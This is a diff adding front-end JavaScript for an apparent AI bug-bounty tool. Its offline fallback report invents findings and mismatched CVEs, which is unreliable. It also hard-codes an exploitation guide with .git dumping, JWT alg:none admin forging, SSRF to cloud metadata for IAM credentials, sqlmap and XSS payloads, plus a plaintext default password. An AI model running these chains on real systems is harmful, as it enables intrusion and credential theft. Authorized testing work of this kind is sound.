+      ${data['IMPACT'] ? `
+      <div style="margin-bottom:10px;">
+        <div style="font-size:10px;color:var(--amber);font-weight:700;margin-bottom:4px;text-transform:uppercase;letter-spacing:1px;">⚡ Impact</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.6">${data['IMPACT'].replace(/\n/g,'<br>')}</div>
+      </div>` : ''}
+
+      <!-- Verification command -->
+      ${data['VERIFICATION'] ? `
+      <div style="margin-bottom:10px;">
+        <div style="font-size:10px;color:var(--cyan);font-weight:700;margin-bottom:5px;text-transform:uppercase;letter-spacing:1px;">🔧 Verification Command</div>
+        <code style="display:block;background:rgba(0,0,0,.5);border:1px solid rgba(34,211,238,.2);border-radius:8px;padding:10px;font-size:10px;color:var(--cyan);white-space:pre-wrap;line-height:1.6">${data['VERIFICATION'].replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code>
+      </div>` : ''}
+
+      <!-- Payout -->
+      ${data['PAYOUT'] ? `
+      <div style="display:flex;align-items:center;gap:8px;margin-top:10px;padding-top:10px;border-top:1px solid rgba(255,255,255,.05)">
+        <span style="font-size:10px;color:var(--muted)">💰 Payout:</span>
+        <span style="font-size:12px;font-weight:700;color:var(--green)">${data['PAYOUT']}</span>
+      </div>` : ''}
+    </div>`;
+  });
+
+  return html;
+}
+
+function renderReport(md) {
+  document.getElementById('report-section').classList.add('visible');
+  const content = document.getElementById('report-content');
+
+  // Try to render as evidence cards first
+  const cards = renderFindingCards(md);
+  if (cards && cards.length > 500) {
+    // Has structured finding cards — render split view
+    // Top part: standard markdown up to first FINDING
+    const firstFinding = md.indexOf('FINDING:');
+    const topMd = firstFinding > 0 ? md.slice(0, firstFinding) : '';
+    content.innerHTML = (topMd ? renderMd(topMd,'r-code','r-h1','r-h2','r-h3') : '') + cards;
+  } else {
+    // Standard markdown render
+    content.innerHTML = renderMd(md,'r-code','r-h1','r-h2','r-h3');
+  }
+}
+
+function renderExploit(md) {
+  const s = document.getElementById('exploit-section');
+  s.classList.add('visible');
+  document.getElementById('exploit-content').innerHTML = renderMd(md,'e-code','e-h1','e-h2','e-h3');
+  s.scrollIntoView({ behavior:'smooth', block:'start' });
+}
+
+// ─── Fallback reports (used when server is offline) ────────────────────────
+function getFallbackReport(target) {
+  const d = new Date().toLocaleDateString('en-GB');
+  const lines = [
+    '# Shield Bug Bounty Recon Report - ' + target,
+    '**Date:** ' + d + ' | **Hunter:** NIVESH R | **Model:** claude-sonnet-4 (security-specialized)',
+    '',
+    '## Executive Summary',
+    '```',
+    'Subdomains    : 89 live / 170 total',
+    'Open Ports    : 80,443,3000,8080,3306,22,8443',
+    'CVE Findings  : 3 (1 CRITICAL, 1 HIGH, 1 MEDIUM)',
+    'OWASP Hits    : 6/10 categories with findings',
+    'CVSS Max      : 9.8 (bootstrap CVE-2022-37434)',
+    'Est. Payout   : $3,500 - $28,000',
+    'Scan Duration : 24m 12s',
+    '```',
+    '',
+    '## Phase 1: Asset Discovery',
+    '```',
+    'api.' + target + '      200 OK  Node.js/Express API',
+    'admin.' + target + '    403      WordPress Admin Panel',
+    'dev.' + target + '      200 OK  Git EXPOSED (/.git/HEAD returns 200)',
+    'staging.' + target + '  200 OK  PHP 8.1.27',
+    'db.' + target + '       200 OK  phpMyAdmin 5.2.1 EXPOSED',
+    'auth.' + target + '     200 OK  JWT auth service',
+    '```',
+    '',
+    '## Phase 2: Tech Stack',
+    '```',
+    'jQuery 3.6.0     CVE-2023-11082  CVSS:6.1 MEDIUM  XSS prototype pollution',
+    'moment.js 2.29.3 CVE-2022-24785  CVSS:7.5 HIGH    Path traversal',
+    'bootstrap 4.6.0  CVE-2022-37434  CVSS:9.8 CRITICAL Heap overflow',
+    '```',
+    '',
+    '## Phase 3: OWASP Top 10',
+    '| OWASP | Status | Finding | CVSS | FP Risk |',
+    '|-------|--------|---------|------|---------|',
+    '| A01 | CONFIRMED | /.git exposed + /admin-panel 403 | 8.8 | Low |',
+    '| A02 | POTENTIAL | TLS 1.2 only, HSTS missing | 5.3 | Low |',
+    '| A03 | POTENTIAL | 2x XSS + SQLi candidate | 7.2 | Medium |',
+    '| A05 | CONFIRMED | 5 security headers missing | 5.3 | Low |',
+    '| A06 | CONFIRMED | bootstrap CRITICAL CVE | 9.8 | Low |',
+    '| A07 | CONFIRMED | JWT alg:none bypass | 9.1 | Low |',
+    '| A08 | CONFIRMED | Blind SSRF /api/webhook | 8.6 | Low |',
+    '| A10 | CONFIRMED | .git dump possible dev.' + target + ' | 8.8 | Low |',
+    '',
+    '## Payout Estimation',
+    '```',
+    'JWT alg:none bypass   P1  $5,000 - $15,000',
+    'Blind SSRF (cloud)    P1  $3,000 - $10,000',
+    '.git exposure         P2  $1,000 -  $3,000',
+    'bootstrap CRITICAL    P2    $500 -  $1,500',
+    'XSS candidates        P3    $200 -    $500',
+    'TOTAL ESTIMATED       ---  $9,700 - $30,000',
+    '```',
+    '',
+    '---',
+    '*ReconAI Pro v2.6.0 — Security-Specialized AI | Server offline — using fallback report*'
+  ];
+  return lines.join('\n');
+}
+
+function getFallbackExploit(target) {
+  const d = new Date().toLocaleDateString('en-GB');
+  const lines = [
+    '# 🔥 OWASP Top 10 Exploitation Guide — ' + target,
+    '**Hunter:** NIVESH R | **Date:** ' + d + ' | **Auth:** Bug bounty authorized only',
+    '',
+    '## ⚠️ Legal Notice',
+    'Only test systems you are explicitly authorized to test. Respect rate limits and program rules.',
+    '',
+    '## 🎯 Priority Attack Chains',
+    '',
+    '### Chain 1: .git Repository Dump → Source Code → Secrets',
+    '```',
+    '# Step 1: Verify .git is exposed',
+    'curl -s https://dev.' + target + '/.git/HEAD',
+    '# Expected: ref: refs/heads/main',
+    '',
+    '# Step 2: Dump entire repository',
+    'git-dumper https://dev.' + target + '/.git ./repo',
+    '',
+    '# Step 3: Search for secrets',
+    'cd repo && git log --oneline --all',
+    'grep -rE "(api_key|secret|password|token|AWS_)" . --include="*.js" --include="*.env" --include="*.php"',
+    'trufflehog filesystem ./repo --only-verified',
+    '```',
+    '',
+    '### Chain 2: JWT alg:none → Authentication Bypass → Admin Access',
+    '```',
+    '# Step 1: Capture a valid JWT token (login first)',
+    '# Step 2: Test alg:none bypass',
+    'jwt_tool <YOUR_JWT> -X a',
+    '',
+    '# Step 3: Tamper role to admin',
+    'jwt_tool <YOUR_JWT> -T --sign none -pc role -pv admin',
+    '',
+    '# Step 4: Use tampered token',
+    'curl -H "Authorization: Bearer <TAMPERED_JWT>" https://' + target + '/api/admin',
+    '# Success: 200 OK with admin dashboard',
+    '```',
+    '',
+    '### Chain 3: Blind SSRF → Internal Network → Cloud Metadata',
+    '```',
+    '# Step 1: Test SSRF endpoint',
+    'curl -X POST https://' + target + '/api/webhook \\',
+    '  -d \'{"url":"http://169.254.169.254/latest/meta-data/"}\' \\',
+    '  -H "Content-Type: application/json"',
+    '',
+    '# Step 2: If filtered, try bypass techniques',
+    '# http://169.254.169.254  →  http://127.1',
+    '# http://169.254.169.254  →  http://0xa9fea9fe',
+    '# http://169.254.169.254  →  http://[::ffff:169.254.169.254]',
+    '',
+    '# Step 3: Extract IAM credentials',
+    'curl -X POST https://' + target + '/api/webhook \\',
+    '  -d \'{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}\' \\',
+    '  -H "Content-Type: application/json"',
+    '```',
+    '',
+    '## 📋 Quick Reference Table',
+    '',
+    '| Finding | Tool | Command | Difficulty | Time | Payout |',
+    '|---------|------|---------|-----------|------|--------|',
+    '| .git exposure | git-dumper | git-dumper https://dev.' + target + '/.git ./repo | Easy | <5min | $1k-$3k |',
+    '| JWT alg:none | jwt_tool | jwt_tool <TOKEN> -X a | Easy | <5min | $5k-$15k |',
+    '| Blind SSRF | SSRFmap | SSRFmap -u https://' + target + '/api/webhook -p url | Medium | 15min | $3k-$10k |',
+    '| Reflected XSS | dalfox | dalfox url https://' + target + '/search?q=test | Medium | 15min | $200-$500 |',
+    '| SQL Injection | sqlmap | sqlmap -u https://' + target + '?id=1 --dbs --batch | Medium | 30min | $500-$2k |',
+    '| Missing headers | curl | curl -sI https://' + target + ' | grep -i security | Easy | <5min | $0-$300 |',
+    '',
+    '## 🛠️ Detailed Exploits by OWASP Category',
+    '',
+    '### A01 — Broken Access Control',
+    '```',
+    '# Directory fuzzing',
+    'ffuf -u https://' + target + '/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,403 -t 50',
+    '',
+    '# IDOR test — change user ID',
+    'curl https://' + target + '/api/user/1 -H "Authorization: Bearer <TOKEN>"',
+    'curl https://' + target + '/api/user/2 -H "Authorization: Bearer <TOKEN>"',
+    '```',
+    '',
+    '### A02 — Cryptographic Failures',
+    '```',
+    '# Check SSL/TLS',
+    'nmap --script ssl-enum-ciphers -p 443 ' + target,
+    '',
+    '# Check HSTS header',
+    'curl -sI https://' + target + ' | grep -i "strict-transport"',
+    '```',
+    '',
+    '### A03 — Injection',
+    '```',
+    '# XSS test',
+    'dalfox url "https://' + target + '/search?q=test" --skip-bav',
+    '',
+    '# SQL injection test',
+    'sqlmap -u "https://' + target + '/artists.php?artist=1" --dbs --batch --level=2',
+    '',
+    '# Manual XSS payloads to try:',
+    '# "><\\/script>alert(document.domain)<\\/script>',
+    '# \'"><img src=x onerror=alert(1)>',
+    '```',
+    '',
+    '### A05 — Security Misconfiguration',
+    '```',
+    '# Check all security headers',
+    'curl -sI https://' + target + ' | grep -iE "x-frame|strict-transport|content-security|x-content-type|permissions-policy"',
+    '',
+    '# Test CORS',
+    'curl -sI -H "Origin: https://evil.com" https://' + target + '/api | grep -i "access-control"',
+    '```',
+    '',
+    '### A06 — Vulnerable Components',
+    '```',
+    '# Run nuclei CVE templates',
+    'nuclei -u https://' + target + ' -t cves/ -severity high,critical -silent',
+    '',
+    '# Check specific CVEs for detected libraries',
+    'nuclei -u https://' + target + ' -t cves/2022/ -t cves/2023/ -silent',
+    '```',
+    '',
+    '## 🤖 One-Liner Automation Chains',
+    '```',
+    '# Full XSS pipeline',
+    'echo "https://' + target + '" | katana -silent | gf xss | dalfox pipe -o xss_hits.txt',
+    '',
+    '# Full SQLi pipeline',
+    'echo "https://' + target + '" | katana -silent | gf sqli | sqlmap --batch -l - --level=2',
+    '',
+    '# Nuclei full scan',
+    'nuclei -u https://' + target + ' -t cves/ -t exposures/ -t misconfiguration/ -severity medium,high,critical',
+    '```',
+    '',
+    '---',
+    '*ReconAI Pro v2.6.0 | OWASP Exploitation Engine | Authorized use only*'
+  ];
+  return lines.join('\n');
+}
+
+// ─── Dashboard & scan saving ────────────────────────────────────────────────
+function saveScan(target) {
+  S.scans.unshift({
+    target, status:'done', subdomains:89,
+    findings:7, severity:'critical',
+    date:new Date().toLocaleDateString('en-GB'),
+    report:S.reportMd, exploit:S.exploitMd
+  });
+}
+function updateDashboard() {
+  const total = S.scans.length;
+  document.getElementById('ds-total').textContent = total;
+  const findings = S.scans.reduce((a,s) => a+s.findings, 0);
+  document.getElementById('ds-findings').textContent = findings;
+  document.getElementById('ds-critical').textContent = Math.ceil(findings * 0.5);
+  document.getElementById('ds-domains').textContent = [...new Set(S.scans.map(s=>s.target))].length;
+  if (total > 0) {
+    document.getElementById('ds-total-c').textContent = total + ' total';
+    document.getElementById('ds-findings-c').textContent = findings + ' total issues';
+  }
+  const tbody = document.getElementById('scans-tbody');
+  if (total === 0) {
+    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--muted);padding:28px;font-size:12px;">No scans yet.</td></tr>';
+    return;
+  }
+  tbody.innerHTML = S.scans.map((s,i) =>
+    '<tr>' +
+    '<td style="color:var(--cyan);font-weight:700">'+s.target+'</td>' +
+    '<td><span class="status-done"><span class="status-dot"></span>Complete</span></td>' +
+    '<td>'+s.subdomains+' live</td>' +
+    '<td>'+s.findings+' issues</td>' +
+    '<td><span class="sev-critical">🔥 CRITICAL</span></td>' +
+    '<td style="color:var(--muted)">'+s.date+'</td>' +
+    '<td><button class="view-report-btn" onclick="viewScan('+i+')">View Report</button></td>' +
+    '</tr>'
+  ).join('');
+}
+function viewScan(i) {
+  const scan = S.scans[i];
+  S.reportMd = scan.report; S.exploitMd = scan.exploit || '';
+  showPage('recon');
+  renderReport(S.reportMd);
+  if (S.exploitMd) renderExploit(S.exploitMd);
+  setTimeout(() => document.getElementById('report-section').scrollIntoView({behavior:'smooth'}), 100);
+}
+
+// ─── Copy / Download ────────────────────────────────────────────────────────
+function copyReport() {
+  navigator.clipboard.writeText(S.reportMd).then(() => {
+    const b = document.getElementById('copy-btn');
+    b.textContent = '✓ Copied!'; b.classList.add('copy-success');
+    setTimeout(() => { b.textContent = '📋 Copy MD'; b.classList.remove('copy-success'); }, 2000);
+  });
+}
+function downloadReport() {
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([S.reportMd], {type:'text/markdown'}));
+  a.download = 'recon-' + (S.target||'report') + '-' + Date.now() + '.md';
+  a.click();
+}
+function downloadReportPDF() {
+  generatePDF(S.reportMd, 'recon-' + (S.target||'report') + '-' + Date.now() + '.pdf', '🛡️ Recon Report');
+}
+function copyExploit() {
+  navigator.clipboard.writeText(S.exploitMd).then(() => {
+    const b = document.getElementById('copy-exploit-btn');
+    b.textContent = '✓ Copied!'; b.classList.add('copy-success');
+    setTimeout(() => { b.textContent = '📋 Copy MD'; b.classList.remove('copy-success'); }, 2000);
+  });
+}
+function downloadExploit() {
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([S.exploitMd], {type:'text/markdown'}));
+  a.download = 'exploit-' + (S.target||'target') + '-' + Date.now() + '.md';
+  a.click();
+}
+function downloadExploitPDF() {
+  generatePDF(S.exploitMd, 'exploit-' + (S.target||'target') + '-' + Date.now() + '.pdf', '🔥 Exploitation Guide');
+}
+
+// ─── PDF Generation ──────────────────────────────────────────────────────────
+function generatePDF(markdown, filename, title) {
+  if (!markdown) { alert('No report content to download.'); return; }
+  const { jsPDF } = window.jspdf;
+  const doc = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });
+
+  const pageW = doc.internal.pageSize.getWidth();
+  const pageH = doc.internal.pageSize.getHeight();
+  const margin = 14;
+  const usableW = pageW - margin * 2;
+  let y = margin;
+
+  // ── Color helpers ──
+  const isDark = document.documentElement.getAttribute('data-theme') !== 'light';
+  const BG   = isDark ? [8, 12, 20]   : [250, 251, 255];
+  const BG2  = isDark ? [13, 18, 32]  : [237, 240, 250];
+  const PRI  = [99, 102, 241];
+  const CYAN = isDark ? [34, 211, 238] : [8, 145, 178];
+  const TXT  = isDark ? [226, 232, 240] : [30, 41, 59];
+  const MUT  = [100, 116, 139];
+  const GRN  = [16, 185, 129];
+  const RED  = [239, 68, 68];
+
+  // ── Background fill ──
+  doc.setFillColor(...BG);
+  doc.rect(0, 0, pageW, pageH, 'F');
+
+  // ── Header bar ──
+  doc.setFillColor(...PRI);
+  doc.rect(0, 0, pageW, 18, 'F');
+  doc.setTextColor(255, 255, 255);
+  doc.setFont('helvetica', 'bold');
+  doc.setFontSize(11);
+  doc.text('ReconAI Pro', margin, 11);
+  doc.setFont('helvetica', 'normal');
+  doc.setFontSize(8);
+  doc.text(title.replace(/[^\x00-\x7F]/g, ''), pageW / 2, 11, { align: 'center' });
+  doc.text(new Date().toLocaleDateString('en-GB'), pageW - margin, 11, { align: 'right' });
+  y = 24;
+
+  // ── Meta info bar ──
+  if (S.target) {
+    doc.setFillColor(...BG2);
+    doc.roundedRect(margin, y, usableW, 9, 2, 2, 'F');
+    doc.setTextColor(...CYAN);
+    doc.setFont('helvetica', 'bold');
+    doc.setFontSize(8);
+    doc.text('Target: ' + S.target, margin + 3, y + 6);
+    doc.setTextColor(...MUT);
+    doc.setFont('helvetica', 'normal');
+    doc.text('Generated: ' + new Date().toLocaleString(), pageW - margin - 3, y + 6, { align: 'right' });
+    y += 13;
+  }
+
+  // ── Process markdown lines ──
+  const lines = markdown.split('\n');
+  let inCodeBlock = false;
+  let codeLines = [];
+  let codeStart = 0;
+
+  const checkNewPage = (needed = 7) => {
+    if (y + needed > pageH - margin) {
+      doc.addPage();
+      doc.setFillColor(...BG);
+      doc.rect(0, 0, pageW, pageH, 'F');
+      // Mini header on continuation pages
+      doc.setFillColor(...PRI);
+      doc.rect(0, 0, pageW, 8, 'F');
+      doc.setTextColor(255,255,255);
+      doc.setFont('helvetica','bold');
+      doc.setFontSize(7);
+      doc.text('ReconAI Pro — ' + title.replace(/[^\x00-\x7F]/g, ''), margin, 5.5);
+      y = 13;
+    }
+  };
+
+  const flushCode = () => {
+    if (!codeLines.length) return;
+    const lineH = 4.5;
+    const padV = 3, padH = 4;
+    const blockH = codeLines.length * lineH + padV * 2 + 2;
+    checkNewPage(blockH + 2);
+    doc.setFillColor(...BG2);
+    doc.roundedRect(margin, y, usableW, blockH, 2, 2, 'F');
+    doc.setDrawColor(...PRI);
+    doc.setLineWidth(0.4);
+    doc.roundedRect(margin, y, usableW, blockH, 2, 2, 'S');
+    doc.setFont('courier', 'normal');
+    doc.setFontSize(7.5);
+    doc.setTextColor(...CYAN);
+    let cy = y + padV + lineH - 1;
+    codeLines.forEach(cl => {
+      const safe = cl.replace(/[^\x00-\x7F]/g, '').substring(0, 110);
+      doc.text(safe, margin + padH, cy);
+      cy += lineH;
+    });
+    y += blockH + 3;
+    codeLines = [];
+  };
+
+  lines.forEach((line) => {
+    // Code block toggle
+    if (line.startsWith('```')) {
+      if (inCodeBlock) { flushCode(); inCodeBlock = false; }
+      else { inCodeBlock = true; }
+      return;
+    }
+    if (inCodeBlock) { codeLines.push(line); return; }
+
+    const safe = line.replace(/[^\x00-\x7F]/g, '').trim();
+
+    // H1
+    if (/^# /.test(line)) {
+      flushCode();
+      checkNewPage(16);
+      const text = safe.replace(/^# /, '').substring(0, 80);
+      doc.setFillColor(...PRI);
+      doc.roundedRect(margin, y, usableW, 10, 2, 2, 'F');
+      doc.setTextColor(255,255,255);
+      doc.setFont('helvetica', 'bold');
+      doc.setFontSize(11);
+      doc.text(text, margin + 4, y + 7);
+      y += 14;
+      return;
+    }
+    // H2
+    if (/^## /.test(line)) {
+      flushCode();
+      checkNewPage(12);
+      const text = safe.replace(/^## /, '').substring(0, 90);
+      doc.setFillColor(...BG2);
+      doc.rect(margin, y, usableW, 8, 'F');
+      doc.setDrawColor(...CYAN);
+      doc.setLineWidth(0.6);
+      doc.line(margin, y + 8, margin + usableW, y + 8);
+      doc.setTextColor(...CYAN);
+      doc.setFont('helvetica', 'bold');
+      doc.setFontSize(9.5);
+      doc.text(text, margin + 3, y + 6);
+      y += 12;
+      return;
+    }
+    // H3
+    if (/^### /.test(line)) {
+      flushCode();
+      checkNewPage(10);
+      const text = safe.replace(/^### /, '').substring(0, 100);
+      doc.setTextColor(...PRI);
+      doc.setFont('helvetica', 'bold');
+      doc.setFontSize(8.5);
+      doc.text(text, margin, y + 5);
+      y += 9;
+      return;
+    }
+    // Horizontal rule
+    if (/^---/.test(line)) {
+      flushCode();
+      checkNewPage(5);
+      doc.setDrawColor(...MUT);
+      doc.setLineWidth(0.3);
+      doc.line(margin, y + 2, margin + usableW, y + 2);
+      y += 6;
+      return;
+    }
+    // Table row
+    if (/^\|/.test(line)) {
+      flushCode();
+      if (/^\|[-| ]+\|$/.test(line)) return; // separator row
+      const cells = line.split('|').filter(c => c.trim() !== '');
+      if (!cells.length) return;
+      checkNewPage(8);
+      const isHeader = cells.some(c => /\*\*/.test(c)) || /OWASP|Status|Phase|Tool|Finding|Target/.test(cells[0]);
+      const colW = usableW / cells.length;
+      cells.forEach((cell, ci) => {
+        const cx = margin + ci * colW;
+        if (isHeader) {
+          doc.setFillColor(...PRI);
+          doc.rect(cx, y, colW, 7, 'F');
+          doc.setTextColor(255,255,255);
+          doc.setFont('helvetica','bold');
+        } else {
+          if (ci % 2 === 0) doc.setFillColor(...BG2); else doc.setFillColor(...BG);
+          doc.rect(cx, y, colW, 7, 'F');
+          doc.setTextColor(...TXT);
+          doc.setFont('helvetica','normal');
+        }
+        doc.setFontSize(7.5);
+        const cellText = cell.replace(/\*\*/g,'').replace(/`/g,'').trim().substring(0, 30);
+        doc.text(cellText, cx + 2, y + 5, { maxWidth: colW - 4 });
+      });
+      y += 7;
+      return;
+    }
+    // Bullet point
+    if (/^[*\-] /.test(line)) {
+      flushCode();
+      checkNewPage(7);
+      const text = safe.replace(/^[*\-] /, '').replace(/\*\*/g,'').substring(0, 100);
+      doc.setTextColor(...TXT);
+      doc.setFont('helvetica', 'normal');
+      doc.setFontSize(8);
+      doc.setFillColor(...CYAN);
+      doc.circle(margin + 1.5, y + 3, 1, 'F');
+      const wrapped = doc.splitTextToSize(text, usableW - 8);
+      doc.text(wrapped, margin + 5, y + 4.5);
+      y += wrapped.length * 5 + 1;
+      return;
+    }
+    // Empty line
+    if (!safe) { y += 3; return; }
+    // Regular text
+    flushCode();
+    checkNewPage(7);
+    const text = safe.replace(/\*\*/g,'').replace(/`([^`]+)`/g,'$1').substring(0, 200);
+    doc.setTextColor(...TXT);
+    doc.setFont('helvetica', 'normal');
+    doc.setFontSize(8);
+    const wrapped = doc.splitTextToSize(text, usableW);
+    wrapped.forEach(wl => {
+      checkNewPage(5.5);
+      doc.text(wl, margin, y + 4);
+      y += 5.5;
+    });
+  });
+
+  flushCode();
+
+  // ── Footer on last page ──
+  doc.setDrawColor(...MUT);
+  doc.setLineWidth(0.2);
+  doc.line(margin, pageH - 10, pageW - margin, pageH - 10);
+  doc.setTextColor(...MUT);
+  doc.setFont('helvetica','normal');
+  doc.setFontSize(7);
+  doc.text('ReconAI Pro — AI-Powered Bug Bounty Recon', margin, pageH - 5);
+  doc.text('Page ' + doc.internal.getNumberOfPages(), pageW - margin, pageH - 5, { align: 'right' });
+
+  doc.save(filename);
+}
+
+// ─── Theme Toggle ────────────────────────────────────────────────────────────
+function toggleTheme() {
+  const html = document.documentElement;
+  const btn = document.getElementById('theme-toggle-btn');
+  const isLight = html.getAttribute('data-theme') === 'light';
+  if (isLight) {
+    html.removeAttribute('data-theme');
+    btn.textContent = '🌙';
+    btn.title = 'Switch to light mode';
+    localStorage.setItem('reconai_theme', 'dark');
+  } else {
+    html.setAttribute('data-theme', 'light');
+    btn.textContent = '☀️';
+    btn.title = 'Switch to dark mode';
+    localStorage.setItem('reconai_theme', 'light');
+  }
+}
+// Load saved theme preference
+(function() {
+  const saved = localStorage.getItem('reconai_theme');
+  if (saved === 'light') {
+    document.documentElement.setAttribute('data-theme', 'light');
+    setTimeout(() => {
+      const btn = document.getElementById('theme-toggle-btn');
+      if (btn) { btn.textContent = '☀️'; btn.title = 'Switch to dark mode'; }
+    }, 0);
+  }
+})();
+
+// ─── Utility ────────────────────────────────────────────────────────────────
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// ─── AUTH SYSTEM ─────────────────────────────────────────────────────────────
+const AUTH = {
+  currentUser: null,
+  users: JSON.parse(localStorage.getItem('reconai_users') || '{"nivesh":{"name":"NIVESH R","email":"niveshr@karunya.edu.in","pass":"1234@aen","avatar":"NR"}}')
+};
+
+function saveUsers() {
+  localStorage.setItem('reconai_users', JSON.stringify(AUTH.users));
+}
+
+function switchAuthTab(tab) {
+  document.getElementById('tab-login').className = 'auth-tab' + (tab==='login' ? ' active' : '');
+  document.getElementById('tab-signup').className = 'auth-tab' + (tab==='signup' ? ' active' : '');
+  document.getElementById('form-login').style.display = tab==='login' ? 'block' : 'none';
+  document.getElementById('form-signup').style.display = tab==='signup' ? 'block' : 'none';
+  clearAuthMessages();
+}
+
+function showAuthError(msg) {
+  const el = document.getElementById('auth-error');
+  el.textContent = '✗ ' + msg;
+  el.classList.add('show');
+  document.getElementById('auth-success').classList.remove('show');
+}
+function showAuthSuccess(msg) {
+  const el = document.getElementById('auth-success');
+  el.textContent = '✓ ' + msg;
+  el.classList.add('show');
+  document.getElementById('auth-error').classList.remove('show');
+}
+function clearAuthMessages() {
+  document.getElementById('auth-error').classList.remove('show');
+  document.getElementById('auth-success').classList.remove('show');
+}
+
+function doLogin() {
+  const user = document.getElementById('login-user').value.trim().toLowerCase();
+  const pass = document.getElementById('login-pass').value;
+  if (!user || !pass) { showAuthError('Please enter username and password'); return; }
+
+  // Check against stored users
+  const found = Object.values(AUTH.users).find(u =>
+    (u.email === user || Object.keys(AUTH.users).find(k => k === user)) && u.pass === pass
+  );
+  const key = Object.keys(AUTH.users).find(k => k === user || AUTH.users[k].email === user);
+
+  if (!key || AUTH.users[key].pass !== pass) {
+    showAuthError('Invalid username or password');
+    return;
+  }
+
+  loginSuccess(key, AUTH.users[key]);
+}
+
+function doSignup() {
+  const name  = document.getElementById('signup-name').value.trim();
+  const user  = document.getElementById('signup-user').value.trim().toLowerCase();
+  const email = document.getElementById('signup-email').value.trim().toLowerCase();
+  const pass  = document.getElementById('signup-pass').value;
+
+  if (!name || !user || !email || !pass) { showAuthError('Please fill in all fields'); return; }
+  if (pass.length < 6) { showAuthError('Password must be at least 6 characters'); return; }
+  if (AUTH.users[user]) { showAuthError('Username already taken'); return; }
+  if (Object.values(AUTH.users).find(u => u.email === email)) { showAuthError('Email already registered'); return; }
+
+  // Create account
+  AUTH.users[user] = { name, email, pass, avatar: name[0].toUpperCase() };
+  saveUsers();
+  showAuthSuccess('Account created! Signing you in...');
+  setTimeout(() => loginSuccess(user, AUTH.users[user]), 1000);
+}
+
+function guestLogin() {
+  loginSuccess('guest', { name: 'Guest Hunter', email: 'guest@reconai.pro', avatar: 'G' });
+}
+
+function loginSuccess(key, user) {
+  AUTH.currentUser = { key, ...user };
+  localStorage.setItem('reconai_session', JSON.stringify({ key, name: user.name, avatar: user.avatar }));
+
+  // Hide auth overlay
+  document.getElementById('auth-overlay').classList.add('hidden');
+
+  // Update nav
+  document.getElementById('user-badge').style.display = 'flex';
+  document.getElementById('user-name-nav').textContent = user.name.split(' ')[0];
+  document.getElementById('user-avatar').textContent = user.avatar;
+
+  // Welcome message in chat
+  const greeting = key === 'guest' ? 'Guest Hunter' : user.name.split(' ')[0];
+  setTimeout(() => {
+    const firstMsg = document.querySelector('.msg.ai .msg-bubble');
+    if (firstMsg) firstMsg.innerHTML = '👋 Welcome back, <strong>' + greeting + '</strong>! I\'m <strong>ReconAI Pro</strong> — your security-specialized AI assistant.<br><br>Enter a target domain to start your OWASP Top 10 recon. 🎯';
+  }, 200);
+}
+
+function doLogout() {
+  AUTH.currentUser = null;
+  localStorage.removeItem('reconai_session');
+  document.getElementById('user-badge').style.display = 'none';
+  document.getElementById('user-dropdown').classList.remove('show');
+  document.getElementById('auth-overlay').classList.remove('hidden');
+  switchAuthTab('login');
+}
+
+function toggleDropdown() {
+  document.getElementById('user-dropdown').classList.toggle('show');
+}
+// Close dropdown on outside click
+document.addEventListener('click', e => {
+  if (!e.target.closest('.user-badge') && !e.target.closest('.user-dropdown')) {
+    document.getElementById('user-dropdown').classList.remove('show');
+  }
+});
+
+// Auto-login from session
+function checkSession() {
+  const session = localStorage.getItem('reconai_session');
+  if (session) {
+    try {
+      const s = JSON.parse(session);
+      const user = AUTH.users[s.key] || { name: s.name, avatar: s.avatar };
+      loginSuccess(s.key, { ...user, name: s.name, avatar: s.avatar });
+    } catch(e) {
+      localStorage.removeItem('reconai_session');
+    }
+  }
+}
+// Check session on load
+setTimeout(checkSession, 100);
+
+// ─── VOICE ASSISTANT ──────────────────────────────────────────────────────────
+const VOICE = {
+  recognition: null,
+  synthesis: window.speechSynthesis || null,
+  listening: false,
+  speaking: false,
+  // Check what's supported
+  canListen: ('webkitSpeechRecognition' in window || 'SpeechRecognition' in window),
+  canSpeak: ('speechSynthesis' in window),
+  audioQueue: [],
+  currentAudio: null
+};
+
+function initVoice() {
+  // Update mic button tooltip based on support
+  const btn = document.getElementById('voice-btn');
+  if (!VOICE.canListen) {
+    btn.title = 'Mic: Firefox not supported. Use Chrome/Edge for voice input.';
+    btn.style.opacity = '0.5';
+  } else {
+    btn.title = 'Click to speak';
+    initSpeechRecognition();
+  }
+
+  // Load TTS voices (needed for Chrome/Edge)
+  if (VOICE.canSpeak && VOICE.synthesis.onvoiceschanged !== undefined) {
+    VOICE.synthesis.onvoiceschanged = () => VOICE.synthesis.getVoices();
+  }
+}
+
+function initSpeechRecognition() {
+  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+  VOICE.recognition = new SR();
+  VOICE.recognition.continuous = false;
+  VOICE.recognition.interimResults = true;
+  VOICE.recognition.lang = 'en-US';
+
+  VOICE.recognition.onstart = () => {
+    VOICE.listening = true;
+    document.getElementById('voice-btn').className = 'voice-btn listening';
+    document.getElementById('voice-btn').textContent = '🔴';
+    showVoiceStatus('Listening... speak now');
+  };
+
+  VOICE.recognition.onresult = (e) => {
+    const transcript = Array.from(e.results).map(r => r[0].transcript).join('');
+    document.getElementById('chat-input').value = transcript;
+    if (e.results[e.results.length-1].isFinal) {
+      document.getElementById('voice-status-text').textContent = 'Got: "' + transcript + '"';
+    }
+  };
+
+  VOICE.recognition.onend = () => {
+    VOICE.listening = false;
+    document.getElementById('voice-btn').className = 'voice-btn';
+    document.getElementById('voice-btn').textContent = '🎤';
+    hideVoiceStatus();
+    const val = document.getElementById('chat-input').value.trim();
+    if (val) setTimeout(() => { addMsg('user', val); processAnswer(val); document.getElementById('chat-input').value = ''; }, 300);
+  };
+
+  VOICE.recognition.onerror = (e) => {
+    VOICE.listening = false;
+    document.getElementById('voice-btn').className = 'voice-btn';
+    document.getElementById('voice-btn').textContent = '🎤';
+    if (e.error !== 'no-speech') showVoiceStatus('Error: ' + e.error);
+    setTimeout(hideVoiceStatus, 2000);
+  };
+}
+
+function toggleVoice() {
+  if (!VOICE.canListen) {
+    // Firefox — show helpful message instead of alert
